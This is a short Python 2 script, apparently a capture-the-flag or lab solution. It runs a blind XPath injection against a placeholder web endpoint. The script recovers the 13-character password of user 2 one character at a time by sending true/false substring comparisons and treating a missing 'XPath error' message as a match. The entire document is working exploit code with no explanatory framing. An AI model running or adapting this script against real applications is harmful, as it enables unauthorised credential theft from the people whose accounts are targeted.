import requests
import time

URL_BASE = "http://xxx?action=user&userid=1 and "
PASS_LEN = 13

def test(r):
    time.sleep(0.2)    
    ok = requests.get(URL_BASE + r, proxies={'http':'http://127.0.0.1:3128/'}).text.find("XPath error") == -1
    if ok:
        print "[+] Test :", r
    return ok

def password(n):
    columns = ["username", "email", "type"]
    data = [["Bob1", "Bob1@web.com", "sub"],
            ["Bob2", "Bob2@web.com", "admin"],
            ["Bob3", "Bob3@web.com", "sub"],
            ["Bob4", "Bob4@web.com", "sub"],
            ["Bob5", "Bob5@web.com", "sub"]]
    for i in range(10):
        if test("number(substring(//user[userid=2]/password,%i,1))=%i" % (n, i)):
            return str(i)
    for col in range(len(columns)):
        for d in range(5):
            for idx in range(len(data[d][col])):
                if test("substring(//user[userid=2]/password,%i,1)=substring(//user[userid=%i]/%s,%d,1)" % (n, d+1, columns[col], idx)):
                    return data[d][col][idx-1]   
    print "Err"

p = ""
for i in range(13):
    print "[+] Finding char %d" % (i+1)
    p += password(i+1)
    print "[+] Password :", p
 